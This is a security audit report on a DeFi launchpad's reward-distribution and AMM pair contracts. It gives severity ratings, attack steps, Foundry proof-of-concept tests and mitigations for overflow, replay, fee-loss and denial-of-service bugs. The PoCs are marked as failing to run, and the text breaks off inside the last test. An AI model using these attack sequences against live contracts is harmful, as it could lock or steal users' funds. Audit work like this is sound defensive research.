# 2025 08 gte perps - Findings Report
## Commit hash: f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7

##Findings by Pattern


 **Derived From** : UnsafeRecipient

[L-1]. Coupled reward claiming causes stuck funds if one asset is non-receivable
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : StandardViolation

[M-2]. Incompatibility with High-Supply Tokens due to uint96 Casting
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: LaunchToken.sol and the exact supply/decimals constraints are not provided here. If the launchpad enforces a max supply below uint96.max or scales shares, the issue may not manifest. However, absent such guarantees, the type limitation is real and can break functionality, so the finding is treated as valid with some uncertainty.
Finding Complexity: 3
Privilege: RequiresRole



 **Derived From** : PermitOrSignatureReplay

[L-3]. Permit Replay Vulnerability due to Cached Domain Separator
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : AccountingInvariantViolation

[M-4]. Accrued Fees Deleted Instead of Distributed in endRewardsAccrual
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 5
Privilege: RequiresRole



 **Derived From** : Arithmetic

[H-5]. Permanent DoS of Staking/Claiming via uint96 overflow in RewardsTrackerLib
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: Exploit requires large magnitude values (S * pending / totalShares > 2^96), which may depend on token supply/decimals and available balances. While feasible in many ERC-20s with large supplies or by attackers donating and immediately reclaiming funds, exact thresholds are context-dependent. Root cause and revert path are clear in code, but practical magnitude varies by deployment.
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : ERC20DecimalsMismatch

[H-6]. Systematic reward loss for high-supply tokens due to insufficient precision factor
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Invariant Type: Arithmetic

[H-7]. Permanent fund lock due to uint96 overflow in reward debt calculation
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless
[H-8]. Catastrophic reward loss for low-decimal tokens due to precision threshold
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 7
Privilege: Permissionless



 **Derived From** : FlashLoanEconomicManipulation

[M-9]. Protocol Fee Bypass via Flash-Liquidity Dilution
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : AccessControlOrAuthByPass

[H-10]. DoS of Reward Pool via Mismatched Quote Asset in addRewards
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Issue Type: AccountingInvariantViolation

[H-11]. AMM Denial of Service when Distributor has Zero Shares
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The broader launchpad orchestration (exact timing of pair creation vs. staking and endRewardsAccrual) is not fully provided, so totalShares == 0 may be avoided operationally. However, from the provided contracts alone the revert condition is unconditional, and a realistic sequence can produce it. In line with C4 guidance, we lean Valid with some uncertainty due to missing surrounding flow code.
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Arithmetic Invariant: user.baseRewardDebt == uint96((shares * accBaseRewardPerShare) / 1e12)

[H-12]. Permanent DoS of Reward Pool via `uint96` Debt Overflow
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : quoteAsset == RewardsTrackerStorage.getRewardPool(launchAsset).quoteAsset

[M-13]. Arbitrary Token Injection Allows Draining of Distributor Quote Assets
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 7
- M: 4
- L: 2
- I: 0

##Findings by Pattern


 **Derived From** : UnsafeRecipient

## [L-1]. Coupled reward claiming causes stuck funds if one asset is non-receivable

### Finding Severity Justification: Impact is limited to users who cannot receive one of the reward tokens (e.g., blacklisted by a token like USDC). No loss of funds occurs; rewards remain safely accounted for and claimable once the impediment is resolved. The issue is a coupled-claim UX/DoS for a subset of users rather than a protocol-wide asset loss or systemic DoS.
## Derived From Pattern/Invariant
UnsafeRecipient

## Exploit Type
Dos

## Location
Distributor.claimRewards

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `claimRewards` function in `Distributor` calls `_distributeAssets`, which attempts to transfer both the Base Asset and Quote Asset in the same transaction. If the transfer of one asset fails (e.g., the user is blacklisted by the USDC contract), the entire transaction reverts. This prevents the user from claiming *any* rewards, including the Base Asset which might be transferrable.

## Impact
Users who cannot receive one of the reward tokens (e.g., blacklisted as a recipient by the quote token) are unable to claim any rewards because claimRewards couples both transfers in a single transaction. No funds are lost; rewards remain accounted for and can be claimed once the impediment is removed. The issue is a user-scoped DoS/UX problem rather than a protocol-wide outage. Severity: Low.

## Command to Run Test


## Proof of Concept
Scenario: A user has pending rewards in both Base and Quote tokens. The Quote token blacklists the user as a recipient. When the user calls claimRewards, the Base transfer succeeds but the subsequent Quote transfer reverts, reverting the entire transaction. Thus, the user cannot claim even the Base token rewards.
Steps:
1) Initialize Distributor with a base and quote reward pair; grant a user shares so rewards accrue.
2) Fund both reward pools via addRewards.
3) Blacklist the user on the Quote token so transfers to the user revert.
4) User calls Distributor.claimRewards(launchAsset).
5) The quote transfer reverts, causing the entire claim to revert, preventing receipt of Base rewards.

## Proof of Code
/// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n, string memory s){ name = n; symbol = s; }
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; emit Transfer(address(0), to, amt); }
    function approve(address spender, uint256 amt) external returns (bool) { allowance[msg.sender][spender] = amt; emit Approval(msg.sender, spender, amt); return true; }
    function transfer(address to, uint256 amt) public virtual returns (bool) { require(balanceOf[msg.sender] >= amt, "bal"); balanceOf[msg.sender] -= amt; balanceOf[to] += amt; emit Transfer(msg.sender, to, amt); return true; }
    function transferFrom(address from, address to, uint256 amt) public virtual returns (bool) { uint256 a = allowance[from][msg.sender]; if (a != type(uint256).max) { require(a >= amt, "allow"); allowance[from][msg.sender] = a - amt; } require(balanceOf[from] >= amt, "bal"); balanceOf[from] -= amt; balanceOf[to] += amt; emit Transfer(from, to, amt); return true; }
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract BlacklistERC20 is MockERC20 {
    mapping(address => bool) public blacklisted;
    constructor(string memory n, string memory s) MockERC20(n, s) {}
    function setBlacklist(address user, bool v) external { blacklisted[user] = v; }
    function transfer(address to, uint256 amt) public override returns (bool) { require(!blacklisted[to], "BLACKLISTED"); return super.transfer(to, amt); }
    function transferFrom(address from, address to, uint256 amt) public override returns (bool) { require(!blacklisted[to], "BLACKLISTED"); return super.transferFrom(from, to, amt); }
}

contract CoupledClaimDoSTest is Test {
    Distributor internal dist;
    MockERC20 internal base;
    BlacklistERC20 internal quote;
    address internal user = address(0xBEEF);

    function setUp() public {
        dist = new Distributor();
        // Set test contract as launchpad
        dist.initialize(address(this));

        base = new MockERC20("BASE", "BASE");
        quote = new BlacklistERC20("QUOTE", "QUOTE");

        // Create rewards pair (only launchpad)
        dist.createRewardsPair(address(base), address(quote));

        // Give the user some shares so rewards accrue (only launchpad)
        dist.increaseStake(address(base), user, 1);

        // Fund rewards
        base.mint(address(this), 100 ether);
        quote.mint(address(this), 100 ether);
        base.approve(address(dist), type(uint256).max);
        quote.approve(address(dist), type(uint256).max);
        dist.addRewards(address(base), address(quote), 10 ether, 10 ether);
    }

    function testCoupledClaimRevertsWhenQuoteTransferBlocked() public {
        // User cannot receive quote token
        quote.setBlacklist(user, true);

        vm.startPrank(user);
        vm.expectRevert(); // Quote transfer fails -> whole claim reverts
        dist.claimRewards(address(base));
        vm.stopPrank();
    }
}


## Suggested Mitigation
Decouple reward claiming per-asset so a failure to transfer one token does not block the other. Concretely:
- Extend RewardsTrackerLib with per-asset claim functions that update only the corresponding reward debt:
  - claimBase(RewardPoolData storage, address user) -> returns baseAmount and sets baseRewardDebt to current accumulated base; quoteRewardDebt unchanged.
  - claimQuote(RewardPoolData storage, address user) -> returns quoteAmount and sets quoteRewardDebt accordingly; baseRewardDebt unchanged.
- In Distributor, add two functions:
  - claimBaseRewards(address launchAsset) external returns (uint256 baseAmount) { baseAmount = rs.claimBase(msg.sender); _transferAndDecreasePending(base, baseAmount); }
  - claimQuoteRewards(address launchAsset) external returns (uint256 quoteAmount) { quoteAmount = rs.claimQuote(msg.sender); _transferAndDecreasePending(quote, quoteAmount); }
This ensures users can always claim whichever asset is receivable. If you wish to keep a combined claim entrypoint, call the two per-asset claimers sequentially and handle transfer failures independently (attempt transfer first, then decreaseTotalPending), without reverting the entire tx when one asset fails.





 **Derived From** : StandardViolation

## [M-2]. Incompatibility with High-Supply Tokens due to uint96 Casting

### Finding Severity Justification: Shares and totalShares are stored as uint96 in RewardsTracker and enforced in Distributor.increaseStake/decreaseStake. For high-supply, 18-decimal tokens, the sum of all staking shares can realistically exceed type(uint96).max (~7.9e28), causing arithmetic overflow on uint96 additions and reverting stake updates. This breaks core launchpad/rewards functionality for a class of standard ERC-20 tokens without directly risking assets, which aligns with Code4rena Medium: protocol functionality impact without direct asset loss.
## Derived From Pattern/Invariant
StandardViolation

## Exploit Type
StandardViolation

## Location
Distributor.increaseStake

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: LaunchToken.sol and the exact supply/decimals constraints are not provided here. If the launchpad enforces a max supply below uint96.max or scales shares, the issue may not manifest. However, absent such guarantees, the type limitation is real and can break functionality, so the finding is treated as valid with some uncertainty.
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `Distributor` and `RewardsTrackerLib` use `uint96` to store user shares and total shares. The `increaseStake` function casts the input `shares` to `uint96`. Many tokens (especially meme tokens explicitly targeted by the protocol) have supplies exceeding `type(uint96).max` (~7.9e28). For example, a token with 100B supply and 18 decimals is `1e29`. Attempts to stake or buy such tokens will revert due to SafeCast overflow, rendering the Launchpad unusable for these assets.

## Impact
Using uint96 for shares and totalShares makes the staking/rewards system incompatible with high-supply, 18-decimal tokens. For example, a 100B-supply token has 1e29 units; with 80% sold on the bonding curve, total staked shares can reach ~8e28, which exceeds type(uint96).max (~7.92e28). This causes: (1) immediate revert on Distributor.increaseStake due to ABI decode into uint96 when shares > type(uint96).max, or (2) revert inside RewardsTrackerLib when cumulative staking pushes totalShares over the limit. The result is a denial-of-service of core launchpad/rewards flows (stake/unstake/claim) for a class of standard ERC-20s. Additionally, baseRewardDebt and quoteRewardDebt stored as uint96 risk overflow under extreme reward accumulation.

## Command to Run Test


## Proof of Concept
Scenario: Launch a token with 100B supply and 18 decimals (total units = 1e29). The launchpad sells 80% on the bonding curve. As buyers accrue staking shares equal to purchased units: (a) If a single increaseStake call attempts to credit > type(uint96).max (~7.92e28) shares, the external call to Distributor.increaseStake(…, shares) reverts during ABI decoding to uint96. (b) Even if each call credits <= type(uint96).max, multiple calls can push totalShares over the uint96 limit, reverting in RewardsTrackerLib when executing self.totalShares += newShares. Consequence: staking updates revert, preventing bonding completion and rewards distribution.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/launchpad/Distributor.sol";

contract Uint96OverflowTest is Test {
    Distributor internal distributor;
    address internal launchpad = address(0xBEEF);
    address internal user = address(0xCAFE);
    address internal asset = address(0xA11CE);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(launchpad);
    }

    // 1) ABI decoding overflow: pass shares > type(uint96).max
    function test_increaseStake_decodingOverflow_reverts() public {
        uint256 tooLargeShares = uint256(type(uint96).max) + 1; // 2**96

        vm.prank(launchpad);
        bytes memory data = abi.encodeWithSelector(
            Distributor.increaseStake.selector,
            asset,
            user,
            tooLargeShares // encoded as uint256; callee decodes to uint96 and reverts
        );

        (bool ok, ) = address(distributor).call(data);
        assertFalse(ok, "call should revert on uint96 ABI decode overflow");
    }

    // 2) Accumulation overflow: two valid stakes that overflow totalShares on addition
    function test_increaseStake_accumulationOverflow_reverts() public {
        // Each call fits in uint96, but sum exceeds type(uint96).max
        uint96 halfPlusOne = uint96(type(uint96).max / 2 + 1);

        vm.startPrank(launchpad);
        // First stake succeeds
        distributor.increaseStake(asset, user, halfPlusOne);

        // Second stake overflows totalShares (uint96 addition in RewardsTrackerLib)
        vm.expectRevert();
        distributor.increaseStake(asset, user, halfPlusOne);
        vm.stopPrank();
    }
}


## Suggested Mitigation
Use wider integer types for all share- and debt-related state and interfaces: (1) Change UserRewardData.shares, baseRewardDebt, quoteRewardDebt and RewardPoolData.totalShares to uint256 (or at minimum uint128). (2) Update IDistributor and Distributor.increaseStake/decreaseStake parameter types to match. (3) Ensure all arithmetic in RewardsTrackerLib uses uint256 intermediates; only downcast to smaller types where storage dictates, guarded by explicit range checks if using uint128. Optionally, introduce a share-scaling strategy (e.g., divide by a configurable scale based on token decimals) to further reduce risk of overflow, but a full move to uint256 is simplest and future-proof.





 **Derived From** : PermitOrSignatureReplay

## [L-3]. Permit Replay Vulnerability due to Cached Domain Separator

### Finding Severity Justification: The cached DOMAIN_SEPARATOR in UniswapV2ERC20 enables cross-chain permit replay after a chainID change (e.g., a hard fork). While approvals on the forked chain can be granted and tokens on that fork stolen, the issue does not impact the canonical chain and requires a fork event to be exploitable. This is a known pattern in many Uniswap V2-derived tokens and is generally treated as a low-severity risk due to low likelihood and impact limited to forked chains.
## Derived From Pattern/Invariant
PermitOrSignatureReplay

## Exploit Type
SignatureReplay

## Location
UniswapV2ERC20.permit

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `UniswapV2ERC20` contract (inherited by `GTELaunchpadV2Pair`) calculates and stores the `DOMAIN_SEPARATOR` in its constructor based on the chain ID at deployment:

```solidity
constructor() {
    // ...
    DOMAIN_SEPARATOR = keccak256(abi.encode(..., chainId, ...));
}
```

The `permit` function uses this stored `DOMAIN_SEPARATOR` without verifying if the current `block.chainid` matches the cached `chainId`. If a hard fork occurs (e.g. Ethereum PoW fork), the `chainId` changes, but the contract continues to accept signatures signed for the old chain ID. This allows valid permits from one chain to be replayed on the forked chain.

## Impact
Tokens can be stolen via replay attacks on forked chains. A user intending to permit a spender on one chain will inadvertently permit them on the other chain.

## Command to Run Test


## Proof of Concept
1. User signs a `permit` off-chain for Chain A (ID 1).
2. Chain A forks into Chain B (ID 2).
3. The contract on Chain B still has `DOMAIN_SEPARATOR` derived from ID 1.
4. Attacker submits the signature to Chain B.
5. The contract validates it against the stored `DOMAIN_SEPARATOR` (ID 1) and approves the spend, allowing the attacker to transfer funds on Chain B.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {UniswapV2ERC20} from "contracts/launchpad/uniswap/UniswapV2ERC20.sol";

contract PermitReplayTest is Test {
    UniswapV2ERC20 token;

    uint256 private ownerPk;
    address private owner;
    address private spender = address(0xBEEF);

    function setUp() public {
        token = new UniswapV2ERC20();
        ownerPk = 0xA11CE;
        owner = vm.addr(ownerPk);
    }

    function testPermitReplayOnChainIdChange() public {
        // 1) Sign permit off-chain for current chainId (Chain A)
        uint256 value = 123 ether;
        uint256 deadline = block.timestamp + 1 days;
        uint256 nonce = token.nonces(owner); // 0

        bytes32 structHash = keccak256(
            abi.encode(
                token.PERMIT_TYPEHASH(),
                owner,
                spender,
                value,
                nonce,
                deadline
            )
        );
        bytes32 digest = keccak256(
            abi.encodePacked("\x19\x01", token.DOMAIN_SEPARATOR(), structHash)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, digest);

        // 2) Simulate a fork where the chainId changes (Chain B)
        uint256 oldChainId = block.chainid;
        vm.chainId(oldChainId + 1);

        // 3) Replay the signature on Chain B. Because DOMAIN_SEPARATOR was cached
        // at deployment with oldChainId, the signature still validates here.
        token.permit(owner, spender, value, deadline, v, r, s);

        // 4) Allowance is set despite chainId change (replay succeeded)
        assertEq(token.allowance(owner, spender), value, "replayed permit should set allowance");
    }
}


## Suggested Mitigation
Use a dynamic EIP-2612 domain separator that updates when block.chainid changes. Keep a cached separator for the deployment chain and recompute otherwise. Example pattern:

- Store:
  uint256 private immutable INITIAL_CHAIN_ID;
  bytes32 private immutable INITIAL_DOMAIN_SEPARATOR;

- In constructor:
  INITIAL_CHAIN_ID = block.chainid;
  INITIAL_DOMAIN_SEPARATOR = keccak256(abi.encode(
      keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
      keccak256(bytes(name)),
      keccak256(bytes("1")),
      block.chainid,
      address(this)
  ));

- Helper:
  function _domainSeparator() internal view returns (bytes32) {
      return block.chainid == INITIAL_CHAIN_ID
          ? INITIAL_DOMAIN_SEPARATOR
          : keccak256(abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes(name)),
                keccak256(bytes("1")),
                block.chainid,
                address(this)
            ));
  }

- In permit(): use _domainSeparator() instead of the cached variable. This matches OZ ERC20Permit behavior and prevents cross-chain replay after chainId changes.





 **Derived From** : AccountingInvariantViolation

## [M-4]. Accrued Fees Deleted Instead of Distributed in endRewardsAccrual

### Finding Severity Justification: Accrued launchpad fees are zeroed and then implicitly reabsorbed into reserves during endRewardsAccrual. This results in permanent loss of matured protocol revenue (not user funds). The impact is real, but limited to protocol fee revenue rather than direct user capital loss, which fits Medium per Code4rena rubric.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.endRewardsAccrual

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `endRewardsAccrual` function is intended to stop future fee accrual, but it incorrectly handles *pending* fees. It explicitly deletes `accruedLaunchpadFee0` and `accruedLaunchpadFee1` without distributing them to the Distributor:

```solidity
function endRewardsAccrual() external {
    // ...
    delete accruedLaunchpadFee0;
    delete accruedLaunchpadFee1;
    // ...
    _update(...);
}
```

In the subsequent `_update` call, `reserve` is recalculated as `balance - totalLaunchpadFee`. Since the accrued fees were deleted (set to 0), `totalLaunchpadFee` is 0. Consequently, `reserve` is set equal to `balance`. The tokens that were previously segregated as accrued fees are re-absorbed into the reserves, effectively redistributing the Launchpad's earned revenue back to the LPs.

## Impact
Accrued protocol revenue is permanently lost when endRewardsAccrual is called with non-zero accruedLaunchpadFee0/1. Because the function deletes these variables before calling _update, the pending fees are implicitly reabsorbed into reserves (reserve = balance since totalLaunchpadFee == 0). This redistributes the protocol’s earned fees to LPs and the Distributor never receives them. Loss is limited to protocol revenue (not user funds) and is irreversible after the call.

## Command to Run Test


## Proof of Concept
A single in-block swap is enough to accrue undistributed launchpad fees, which are then deleted and absorbed into reserves by endRewardsAccrual:

1) Initialize pair with non-zero launchpadFeeDistributor and rewardsPoolActive == 1; add initial liquidity and mint LP to the launchpadLp.
2) Perform one swap in the same block as the latest _update (i.e., immediately after mint) so timeElapsed == 0. The swap accrues fees into accruedLaunchpadFee0/1 (LaunchpadFeesAccrued event).
3) Call endRewardsAccrual (authorized role). The function deletes accruedLaunchpadFee0/1 and then calls _update with newLaunchpadFee0/1 == 0.
4) Inside _update, totalLaunchpadFee0/1 == 0 so reserves are set to the full balances. The previously accrued fees are now part of reserves; no distribution occurs, and the Distributor receives nothing.
5) Observables: getAccruedLaunchpadFees() > 0 before endRewardsAccrual; 0 after; no calls to Distributor in between.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s, uint8 d) { name = n; symbol = s; decimals = d; }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

// Test contract also acts as a mock UniswapV2Factory for _mintFee() -> feeTo()
contract EndRewardsAccrualTest is Test {
    // Satisfy pair._mintFee -> IUniswapV2Factory(factory).feeTo()
    function feeTo() external view returns (address) { return address(0); }

    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;

    function setUp() public {
        token0 = new MockERC20("T0", "T0", 18);
        token1 = new MockERC20("T1", "T1", 18);

        // Deploy pair. Its constructor sets factory = msg.sender (this test contract).
        pair = new GTELaunchpadV2Pair();

        // Initialize with launchpadLp = lp and launchpadFeeDistributor = this (authorized to endRewardsAccrual)
        address lp = address(0xBEEF);
        pair.initialize(address(token0), address(token1), lp, address(this));

        // Seed liquidity
        token0.mint(address(this), 1_000_000 ether);
        token1.mint(address(this), 1_000_000 ether);
        token0.transfer(address(pair), 100_000 ether);
        token1.transfer(address(pair), 100_000 ether);
        pair.mint(lp); // mints LP and sets blockTimestampLast
    }

    function test_endRewardsAccrual_losesAccruedFees() public {
        (uint112 r0, uint112 r1, ) = pair.getReserves();

        // Prepare a valid swap: provide token0 in, receive token1 out
        uint256 amount0In = 1_000 ether;
        // Uniswap V2 formula: amount1Out = (amount0In*997*reserve1) / (reserve0*1000 + amount0In*997)
        uint256 amount1Out = (amount0In * 997 * uint256(r1)) / (uint256(r0) * 1000 + amount0In * 997);
        assertGt(amount1Out, 0, "amount1Out=0");

        // Pre-fund input, then swap in same block (timeElapsed == 0 => fees accrue but are not distributed)
        token0.transfer(address(pair), amount0In);
        pair.swap(0, amount1Out, address(this), new bytes(0));

        (uint112 f0, uint112 f1, ) = pair.getAccruedLaunchpadFees();
        assertGt(f0, 0, "fees should accrue for token0");
        // End rewards accrual as the authorized distributor
        pair.endRewardsAccrual();

        (f0, f1, ) = pair.getAccruedLaunchpadFees();
        assertEq(f0, 0, "fees zeroed out");
        assertEq(f1, 0, "fees zeroed out");
        // No distribution occurred; pending fees were absorbed into reserves.
    }
}

## Suggested Mitigation
Ensure any pending accrued fees are flushed to the Distributor (or otherwise safely handled) before zeroing them and updating reserves. Do not rely on _update() timing (timeElapsed > 0) for the final distribution.

Suggested approach:
- Snapshot the current accrued amounts at the start of endRewardsAccrual: f0 = accruedLaunchpadFee0, f1 = accruedLaunchpadFee1.
- If (f0 | f1) > 0, attempt to distribute them immediately via an internal call to _distributeLaunchpadFees(f0, f1) before deleting the accrued variables and before the _update() call. Consider wrapping the external addRewards() in try/catch to avoid reverting if the Distributor has zero shares; alternatively, expose a non-reverting flush method on the Distributor for the shutdown path.
- After successful (or handled) distribution, set accruedLaunchpadFee0/1 = 0, set rewardsPoolActive = 0, optionally set launchpadFeeDistributor = address(0), and then call _update(...) with newLaunchpadFee0/1 = 0.

This guarantees matured protocol fees are not reabsorbed into LP reserves and eliminates timing dependence on block timestamp for the final payout.





 **Derived From** : Arithmetic

## [H-5]. Permanent DoS of Staking/Claiming via uint96 overflow in RewardsTrackerLib

### Finding Severity Justification: Reward debts are stored as uint96 and are set from a uint256 computation without safe casting. An attacker can inflate accRewardPerShare by adding rewards when totalShares is minimal, causing totalAccRewards(shares, acc) to exceed 2^96-1, truncating the stored baseRewardDebt/quoteRewardDebt. Subsequent claim/unstake computes a massive pending amount, which exceeds Distributor.totalPendingRewards and reverts, permanently preventing users from claiming matured rewards and, during bonding, can block decreaseStake flows. Loss of matured rewards and potential inability to exit during bonding constitute high-impact loss of assets/availability.
## Derived From Pattern/Invariant
Arithmetic

## Exploit Type
IntegerOverflow

## Location
Distributor.stake / claimRewards

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: Exploit requires large magnitude values (S * pending / totalShares > 2^96), which may depend on token supply/decimals and available balances. While feasible in many ERC-20s with large supplies or by attackers donating and immediately reclaiming funds, exact thresholds are context-dependent. Root cause and revert path are clear in code, but practical magnitude varies by deployment.
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `RewardsTrackerLib` casts the calculated debt to `uint96` in `stake`, `unstake`, and `claim` functions: `userData.baseRewardDebt = uint96(totalAccRewards(...))`. `totalAccRewards` is calculated as `(shares * accRewardPerShare) / 1e12`.

An attacker can manipulate `accRewardPerShare` to be extremely large by adding rewards when `totalShares` is minimal (e.g., 1 wei). If `accRewardPerShare` exceeds `type(uint96).max` (approx `7.9e28`), or is large enough that `shares * acc` overflows `uint96`, the stored `baseRewardDebt` will be truncated and incorrect.

When the user subsequently tries to `claim` or `unstake`, the full `uint256` calculation of `totalAccRewards` is used against the truncated `debt`, resulting in a massive `pending` reward amount. The `Distributor` then attempts to decrement `totalPendingRewards` by this massive amount. This check fails (underflow protection or insufficient global balance), causing the transaction to revert. This permanently locks the user's principal stake.

## Impact
Casting totalAccRewards into uint96 for baseRewardDebt/quoteRewardDebt truncates large values when acc{Base,Quote}RewardPerShare is spiked while totalShares is small. Subsequent claim/unstake computes pending rewards using full 256-bit math and subtracts the truncated stored debt, yielding an enormous pending amount. Distributor then reverts on _decreaseTotalPending with ClaimAmountExceedsTotalPendingRewards, blocking both claiming and stake adjustments that distribute rewards. Because acc* can be globally inflated by adding rewards while totalShares is minimal, all current and future stakers in the pool can be bricked. This results in permanent loss of availability of matured rewards and can prevent decreaseStake operations during bonding.

## Command to Run Test


## Proof of Concept
Attack outline:
- Preconditions: A rewards pair exists; Distributor.launchpad is set; anyone can call addRewards; only the launchpad can increase/decrease stake.
- Step 1 (minimize denominator): Attacker obtains 1 wei share (e.g., by buying via launchpad so that launchpad calls increaseStake(base, attacker, 1)). Now totalShares = 1.
- Step 2 (spike acc): Attacker calls addRewards(base, quote, R, 0) with a large R (e.g., 100e18). The virtual new accBaseRewardPerShare becomes acc += R * 1e12 / totalShares ≈ 100e30.
- Step 3 (victim stakes): A new user acquires standard shares via launchpad, e.g., increaseStake(base, victim, 1e18). stake() calls update() to realize the huge acc, then sets userData.baseRewardDebt = uint96(totalAccRewards(victimShares, acc)). With shares=1e18 and acc≈100e30, totalAccRewards≈1e18*100e30/1e12=1e38. Casting 1e38 to uint96 truncates to a small number.
- Step 4 (DoS on claim/unstake): When the victim calls claim() or the launchpad calls decreaseStake() for the victim, the library recomputes totalAccRewards as full uint256 (≈1e38) and subtracts the truncated debt, producing a massive pending amount. Distributor._decreaseTotalPending reverts with ClaimAmountExceedsTotalPendingRewards because totalPendingRewards only tracks the actually added 100e18, far less than the computed pending. This blocks claims and stake adjustments. Any subsequent staker will also have their rewardDebt truncated under the huge acc and become bricked.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor(string memory n, string memory s, uint8 d) { name = n; symbol = s; decimals = d; }
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; emit Transfer(address(0), to, amt); }
    function approve(address sp, uint256 amt) external returns (bool) { allowance[msg.sender][sp] = amt; emit Approval(msg.sender, sp, amt); return true; }
    function transfer(address to, uint256 amt) external returns (bool) { _transfer(msg.sender, to, amt); return true; }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender]; require(a >= amt, "allowance"); if (a != type(uint256).max) allowance[from][msg.sender] = a - amt; _transfer(from, to, amt); return true; }
    function _transfer(address from, address to, uint256 amt) internal { require(balanceOf[from] >= amt, "bal"); balanceOf[from] -= amt; balanceOf[to] += amt; emit Transfer(from, to, amt); }
}

contract RewardsDebtOverflowTest is Test {
    Distributor distributor;
    MockERC20 base;
    MockERC20 quote;

    address attacker = address(0xA11CE);
    address victim = address(0xBEEF);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(address(this)); // set launchpad to this test contract

        base = new MockERC20("BASE", "BASE", 18);
        quote = new MockERC20("QUOTE", "QUOTE", 18);

        // Create rewards pair (onlyLaunchpad)
        distributor.createRewardsPair(address(base), address(quote));

        // Attacker stakes 1 wei share via launchpad (onlyLaunchpad)
        distributor.increaseStake(address(base), attacker, 1);

        // Fund this contract with base rewards and approve Distributor
        base.mint(address(this), 100e18);
        base.approve(address(distributor), type(uint256).max);
    }

    function test_DoS_claim_and_unstake_due_to_uint96_truncation() public {
        // Add large rewards while totalShares == 1 -> spikes accBaseRewardPerShare
        distributor.addRewards(address(base), address(quote), uint128(100e18), 0);

        // Victim stakes a normal amount; stake() update() realizes huge acc and sets truncated rewardDebt
        distributor.increaseStake(address(base), victim, 1e18);

